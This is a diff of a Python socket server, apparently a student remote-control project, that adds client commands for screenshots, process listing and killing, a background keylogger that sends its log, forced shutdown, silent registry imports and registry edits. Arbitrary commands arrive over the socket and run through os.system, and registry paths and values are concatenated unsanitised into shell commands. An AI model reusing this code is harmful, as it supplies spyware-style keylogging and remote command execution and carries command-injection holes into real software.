@@ -2,65 +2,91 @@ import sys
 import socket
 import threading
 import time
+from PIL import Image
+import numpy as np
 from ScreenShot import*
 from RunningProccess import*
 from KeyLogger import*
 from ShutDown import*
 from Registry import*
-
+from tkinter import*
 HEADER = 64
 PORT = 5050
-#SERVER = socket.gethostbyname(socket.gethostname())
+# SERVER = socket.gethostbyname(socket.gethostname())
 SERVER = "127.0.0.1"
 ADDR= (SERVER, PORT)
 FORMAT = 'utf-8'
 DISCONNECT_MESSAGE = "DISCONNECT!"
 TAKE_SCREEN_SHOT = "TAKE SCREENSHOT"
 RUNNING_PROCESS ="CHECK RUNNING PROCESS"
-STOP_LISTING = "STOP LISTING"
+RUNNING_APP ="CHECK RUNNING APP"
+STOP_LISTING = "STOP"
+START_LISTING = "START LISTING"
+KILL_APP_VIA_PID = "KILL APP VIA PID"
 KILL_PROCESS_VIA_PID = "KILL PROCESS VIA PID"
 KILL_PROCESS_VIA_NAME = "KILL PROCESS VIA NAME"
-KEY_LOGGING ="KEY LOG"
+START_PROCESS = "START PROCESS"
+KEYLOGGING ="KEY LOG"
+STOP_KEYLOGGING = "STOP KEYLOGGING"
+PRINT_KEYLOG = "PRINT KEYLOG"
 SHUTDOWN = "SHUTDOWN"
 CANCEL_SHUTDOWN = "CANCEL SHUTDOWN"
 SEND_FILE = "SEND FILE"
 SEND_REG_FILE = "SEND REG FILE"
-CREATE_REG_KEY = "CREATE REG KEY"
+DELETE_KEY_VALUE = "DELETE REG VALUE"
 GET_KEY_VALUE = "GET KEY VALUE"
 ADD_NEW_KEY = "ADD NEW KEY"
-DEL_KEY = "DELETE KEY"
+DELETE_KEY = "DELETE KEY"
+SET_KEY_VALUE ="SET KEY VALUE"
 
 
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 server.bind(ADDR)
 
 
-def conn_send(conn,send_this):
-    conn.send(send_this.encode(FORMAT))
-def conn_recv(conn):
-    return conn.recv(1024).decode(FORMAT)
+def send1(conn,msg):
+    message = msg.encode(FORMAT)
+    msg_length = len(message)
+    send_length = str(msg_length).encode(FORMAT)
+    send_length += b' ' * (HEADER - len(send_length))
+    conn.send(send_length)
+    conn.send(message)
 
-def conn_recv_reg_file(conn):
-    filename = conn.recv(1024).decode(FORMAT)
-    if filename != "NO FILE SENT!": 
-        with open(filename + "_from_client.reg","w") as file:
-            content_length = conn.recv(HEADER).decode(FORMAT)
-            if content_length:
-                content_length = int(content_length)
-                content = conn.recv(content_length).decode(FORMAT)
-            file.write(content)
-        os.system("regedit /s " + filename)
-        return True
-    return False
-            
+def recv1(conn):
+    msg_length = conn.recv(HEADER).decode(FORMAT)
+    if msg_length:
+        msg_length = int(msg_length)
+        msg = conn.recv(msg_length).decode(FORMAT)
+        return msg
+    return ""
 
-
-
-
+def get_Size(fileobject):
+    fileobject.seek(0,2) # move the cursor to the end of the file
+    size = fileobject.tell()
+    return size
 
 
-def handle_client(conn, addr):
-    print(f"[NEW CONNECTION] {addr} connected.")
+def send_file1(conn,filename):
+    file = open(filename,"rb")
+    size = get_Size(file)
+    
+    file.close()
+    send1(conn,str(size))
+    t = size/2
+    t = int(t)
+    with open(filename,'rb') as fp:
+        for i in range(t):
+            data = fp.read(2)
+            conn.send(data)
+
+
+
+
+
+
+
+
+def handle_client(conn, addr):    
     connected = True
     while connected:
         msg_length = conn.recv(HEADER).decode(FORMAT)
@@ -68,133 +94,174 @@ def handle_client(conn, addr):
             msg_length = int(msg_length)
             msg = conn.recv(msg_length).decode(FORMAT)
             print(f"[{addr}] {msg}") 
-            reply=""
+            
 
 
             if msg == TAKE_SCREEN_SHOT:
-                Take_Screenshot(os.getcwd() + "\\ScreenShot.png")
-                reply +="SREENSHOT TAKEN."
+                Take_Screenshot("ScreenShot.png")
+                send_file1(conn,"ScreenShot.png")
+                    
+
 
 
             elif msg == RUNNING_PROCESS:
-                obj = wmi.WMI()
-                print("pid   Process name")
-                conn.send("pid   Process name".encode(FORMAT))
-                for process in obj.Win32_Process():
-                    print(f"{process.ProcessId:<10} {process.Name}")
-                    conn.send(f"{process.ProcessId:<10} {process.Name}".encode(FORMAT))
-                conn.send(STOP_LISTING.encode(FORMAT))
-                reply +="PROCCESS LISTED"
+                
+                list_proc = enum_running_process()
+                size = len(list_proc)
+                size = str(size)
+                if size =='0':
+                    send1(conn,'No running app!')
+                else:
+                    send1(conn,size)
+                    for app in list_proc:
+                        send1(conn,app[0])
+                        send1(conn,app[1])
+                        send1(conn,app[2])
+                
+
 
 
 
             elif msg == KILL_PROCESS_VIA_PID:
-                conn.send("Deleting process with PID: ".encode(FORMAT))
-                pid = conn.recv(1024).decode(FORMAT)
+                
+                pid = recv1(conn)
                 pid = int(pid)
                 process_killed = kill_process_by_id(pid)
-                if process_killed == True:
-                    reply += f"PROCESS ID: {pid} TERMINATED"
-                else:
-                    reply += f"PROCESS ID: {pid} NOT FOUND"
-
+                send1(conn,str(process_killed))
+                
             
 
-            elif msg == KILL_PROCESS_VIA_NAME:
-                conn.send("Deleting process with process's name: ".encode(FORMAT))
-                p_name = conn.recv(1024).decode(FORMAT)
-                process_killed = kill_process_by_name(p_name)
-                if process_killed == True:
-                    reply += f"{p_name} TERMINATED"
-                else:
-                    reply += f"{p_name} NOT FOUND"
-
+        
+                
             
-            elif msg == KEY_LOGGING:
-                conn.send("Key Logger is active ... ".encode(FORMAT))
-                key_log_string = Key_Log()
-                #print(key_log_string)
-                conn.send(key_log_string.encode(FORMAT))
-                reply += "KEYLOG FINISH"
+            elif msg == START_PROCESS:
+                proc = recv1(conn)
+                os.system(proc)
+
+                
+            elif msg == KEYLOGGING:
+                def init_listener():
+                    with Listener(on_press = getKey) as listener:
+                        listener.join()
+                sidequest_thread = threading.Thread(target= init_listener)
+                sidequest_thread.start()
+            
+            elif msg == STOP_KEYLOGGING:
+                for i in range(10):
+                    Key_press(Key.f12)
+                
+            
+            elif msg == PRINT_KEYLOG:
+                try:
+                    
+                    with open("KeyLog.txt","r") as file:
+                        key_log_string=file.read()
+                        
+                    send1(conn,key_log_string)
+                    #Delete previous log
+                    os.remove('KeyLog.txt')
+                except FileNotFoundError:
+                    send1(conn,"File not found")
+
+
             elif msg == SHUTDOWN:
-                conn.send("Input time remained until shutdown: ".encode(FORMAT))
-                sec = conn.recv(1024).decode(FORMAT)
-                reply += f"SERVER WILL SHUTDOWN IN {sec} SECONDS"
-                sec = int(sec)
+                sec = 40
+                send1(conn,f"Server shutdown in {sec} seconds")
                 shutdown(sec)
 
-            elif msg == CANCEL_SHUTDOWN:
-                cancel_shutdown()
-                reply += "SHUTDOWN CANCELED"
+            
+                
 
 
             elif msg == SEND_REG_FILE:
-                if conn_recv_reg_file(conn):
-                    reply += "FILE RECEIVED"
-                else:
-                    reply += "NO FILE RECEIVED"
+                content = recv1(conn)
+                filename = "C:\Client_Reg.reg"
+                with open(filename,'w') as reg_file:
+                    reg_file.write(content)
+                os.system("regedit /s " + filename)
+                
 
             elif msg == GET_KEY_VALUE:
-                path = conn.recv(1024).decode(FORMAT)
-                name = conn.recv(1024).decode(FORMAT)
-                res = get_registry_value(path,name)
-                if res == "ERROR: INVALID PATH":
-                    reply = res
-                else :
-                    reply += path+ "   "+name+"    "+res
+                path = recv1(conn)
+                value = recv1(conn)
+                ans = get_registry_value(path,value)
+                send1(conn,ans)
+
+            elif msg == DELETE_KEY_VALUE:
+                path = recv1(conn)
+                print(path)
+                value = recv1(conn)
+                print(value)
+                ans = os.system("reg delete "+path+" /v "+ value + " /f")
+                send1(conn,str(ans))
 
             elif msg == ADD_NEW_KEY:
-                path = conn.recv(1024).decode(FORMAT)
-                hkey, sub_key = getKeyFromPath(path)
-                if hkey is None:
-                    reply += "ERROR: INVALID PATH"
-                else:
-                    try:
-                        os.system("reg add "+path)
-                        reply += "ADD REGISTRY KEY SUCCESSFULLY"
-                    except :
-                        reply += "ERROR!"
+                path = recv1(conn)
+                ans = os.system('reg add '+ path)
+                send1(conn,str(ans))
 
-            elif msg == DEL_KEY:
-                path = conn.recv(1024).decode(FORMAT)
-                hkey, sub_key = getKeyFromPath(path)
-                if hkey is None:
-                    reply += "ERROR: INVALID PATH"
+            elif msg == DELETE_KEY:
+                path = recv1(conn)
+                ans = os.system('reg delete '+ path + ' /f')
+                send1(conn,str(ans))
+
+            
+            elif msg == SET_KEY_VALUE:
+                path = recv1(conn)
+                value = recv1(conn)
+                data = recv1(conn)
+                data_type = recv1(conn)
+                ans = os.system('reg add '+ path +' /v '+ value+ ' /t '+ data_type+ ' /d '+data+ ' /f')
+                send1(conn,str(ans))
+
+
+            elif msg == RUNNING_APP:
+                list_app = enum_running_app()
+                size = len(list_app)
+                if size > 0:
+                    size = str(size)
+                    send1(conn,size)
+                    for app in list_app:
+                        send1(conn,app[0])
+                        send1(conn,app[1])
+                        send1(conn,app[2])
+                    
                 else:
-                    try:
-                        os.system("reg delete "+path + " /f")
-                        reply += "DELETE REGISTRY KEY SUCCESSFULLY"
-                    except :
-                        reply += "ERROR!"
+                    send1(conn,"No running app!")
+                
+            
 
 
             elif msg == DISCONNECT_MESSAGE:
-                reply +="CONNECTION TERMINATED!"
                 connected = False
             
-            
-
-            else:
-                reply += "MESSAGE RECEIVED."
+            else: pass
             time.sleep(0.500)
-            conn.send(reply.encode(FORMAT))
-            #print(f"[{addr}] {msg}")    
             
     conn.close()
 
 
-def start():
-    server.listen()
-    print(f"[LISTENING] Server is listening on {SERVER}")
-    while True:
-        conn, addr = server.accept()
-        thread = threading.Thread(target = handle_client, args= (conn,addr))
-        thread.start()
-        print(f"[ACTIVE CONNECTIONS] {threading.activeCount() - 1}")
-
 
     
-# print("[STARTING] server is starting ...")
-# start()
+    
+def start():
+    print("[STARTING] server is starting ...")
+    server.listen()
+    print(f"[LISTENING] Server is listening on {SERVER}")
+    conn, addr = server.accept()
+    handle_client(conn,addr)
 
-# C:\Users\MSI-NK\OneDrive\Máy tính\Code\DoAnSocket
+
+
+Server_windows = Tk()
+Server_windows.title("Open")
+Server_windows.geometry("200x200")
+
+OpenServer_button = Button(Server_windows, text = "Open Server", command= start)
+OpenServer_button.place(x = 25, y =25, width = 150, height = 150)
+
+Server_windows.mainloop()
+
+    
+
+
